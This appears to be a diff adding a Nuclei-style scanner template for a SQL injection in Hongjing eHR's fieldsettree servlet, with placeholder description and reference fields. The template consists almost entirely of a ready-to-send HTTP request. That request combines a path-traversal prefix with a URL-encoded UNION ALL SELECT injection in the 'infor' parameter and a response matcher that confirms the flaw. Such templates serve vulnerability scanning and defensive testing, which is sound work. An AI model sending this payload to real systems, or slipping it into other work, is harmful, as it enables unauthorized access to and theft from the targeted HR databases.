@@ -1,0 +1,26 @@
+id: hongjing-HCM-fieldsettree-sqli
+
+info:
+  name: 宏景eHR fieldsettree SQL注入漏洞
+  author: mhb17
+  severity: high
+  description: description
+  reference:
+    - https://
+  tags: sqli
+
+requests:
+  - raw:
+      - |+
+        GET /templates/attestation/../../servlet/fieldsettree?flag=2&infor=1%27%20UNION%20ALL%20SELECT%2018%2CCHAR%28113%29%2BCHAR%28106%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28113%29%2B%28CASE%20WHEN%20%28SYSDATETIME%28%29%3DSYSDATETIME%28%29%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%2BCHAR%28113%29%2BCHAR%28107%29%2BCHAR%28118%29%2BCHAR%28106%29%2BCHAR%28113%29%2C18--%20ltAi HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "qjjpq1qkvjq"
+        part: body
